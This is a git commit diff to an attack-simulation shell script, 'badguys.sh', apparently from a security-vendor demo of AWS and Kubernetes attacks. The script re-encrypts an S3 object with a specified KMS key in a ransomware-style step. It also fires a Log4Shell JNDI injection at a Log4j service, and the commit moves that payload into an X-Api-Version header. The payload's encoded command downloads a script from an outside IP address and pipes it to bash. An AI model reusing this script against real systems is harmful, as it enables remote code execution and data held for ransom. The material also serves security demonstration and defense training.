5d374f88a0ac225a80921ead8b97672f507f028b
Jeff Fry <jeff.fry@lacework.net>
2022-01-23 17:36:42 -0800

    Code updates.

--- scripts/badguys.sh
+++ scripts/badguys.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
+sleep ${RANDOM/2}
 aws s3api list-buckets
 aws s3 cp s3://$2-ransomware-target-bucket/awsimmersionday/app/app.zip s3://$2-ransomware-target-bucket/awsimmersionday/app/app.zip --sse aws:kms --sse-kms-key-id arn:aws:kms:us-west-2:911290716430:key/e1583228-d021-4f40-b83b-52fd722074e9
 aws eks --region $1 update-kubeconfig --name $2-eks
 url=$(kubectl describe service log4j-app | grep 'LoadBalancer Ingress:' | awk '{printf "http://%s:8080",$3;}')
 echo $url
-curl -v $url/?x=${jndi:ldap://93[.]189[.]42.8:5557/Basic/Command/Base64/KGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQgLXEgLU8tIDkzLjE4OS40Mi44L2xoLnNoKXxiYXNo}
+curl -v $url -H 'X-Api-Version:${jndi:ldap://93.189.42.8:5557/Basic/Command/Base64/KGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQgLXEgLU8tIDkzLjE4OS40Mi44L2xoLnNoKXxiYXNo}'
